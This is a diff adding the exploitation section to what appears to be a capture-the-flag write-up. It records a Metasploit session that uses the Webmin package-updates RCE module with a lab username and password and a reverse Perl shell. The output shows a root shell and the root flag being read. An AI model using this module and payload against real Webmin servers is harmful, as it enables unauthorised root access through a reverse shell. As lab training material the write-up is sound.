@@ -487,10 +487,95 @@ Matt       1208  0.0  0.1  14428  1060 pts/0    S+   10:22   0:00 grep --color=a
 
 ### Exploitation
 
-Step-by-step privilege escalation.
 
 ```shell
-# Commands used
+msfconsole -q
+msf > search webmin
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank       Check  Description
+   -   ----                                           ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
+   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
+   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
+   4     \_ target: Unix In-Memory                    .                .          .      .
+   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
+   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
+   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
+   12    \_ target: Automatic (Linux Dropper)         .                .          .      .
+
+
+Interact with a module by name or index. For example info 12, use 12 or use exploit/linux/http/webmin_backdoor
+After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'
+
+msf > use 7
+[*] Using configured payload cmd/unix/reverse_perl
+msf exploit(linux/http/webmin_packageup_rce) > options
+
+Module options (exploit/linux/http/webmin_packageup_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Webmin Password
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      10000            yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path for Webmin application
+   USERNAME                    yes       Webmin Username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin <= 1.910
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/http/webmin_packageup_rce) > set lhost tun0
+lhost => 10.10.15.80
+msf exploit(linux/http/webmin_packageup_rce) > set username Matt
+username => Matt
+msf exploit(linux/http/webmin_packageup_rce) > set password computer2008
+password => computer2008
+msf exploit(linux/http/webmin_packageup_rce) > set ssl true
+[!] Changing the SSL option's value may require changing RPORT!
+ssl => true
+msf exploit(linux/http/webmin_packageup_rce) > run
+[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf exploit(linux/http/webmin_packageup_rce) > set rhosts 10.129.140.170
+rhosts => 10.129.140.170
+msf exploit(linux/http/webmin_packageup_rce) > run
+[*] Started reverse TCP handler on 10.10.15.80:4444 
+[+] Session cookie: e0b4aac07f5aba7a769a5923fa7702e8
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.15.80:4444 -> 10.129.140.170:51060) at 2026-09-21 05:26:50 -0400
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+bf1b096f487286942993d6f0d7a844e2
+
+
 ```
 
 ---
